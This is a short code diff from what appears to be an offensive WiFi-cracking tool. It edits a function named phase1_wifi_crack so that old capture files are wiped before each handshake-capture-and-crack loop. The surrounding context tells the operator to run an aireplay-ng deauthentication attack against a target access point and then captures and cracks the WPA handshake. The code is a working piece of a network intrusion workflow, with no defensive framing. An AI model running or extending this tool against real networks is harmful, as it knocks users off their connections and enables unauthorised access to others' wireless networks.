@@ -577,6 +577,12 @@ def phase1_wifi_crack() -> PhaseResult:
 
     # ── Handshake capture + crack loop ────────────────────────────────────────
     while True:
+        # Wipe previous captures so airodump-ng always writes -01.cap
+        import glob as _glob
+        for _old in _glob.glob(f"{cap}*.cap"):
+            try: os.remove(_old)
+            except OSError: pass
+
         ok(f"Capturing handshake on CH {channel} (60 s)...")
         warn(f"Run deauth in another terminal: sudo aireplay-ng --deauth 10 -a {bssid} {iface}")
         run_cmd(
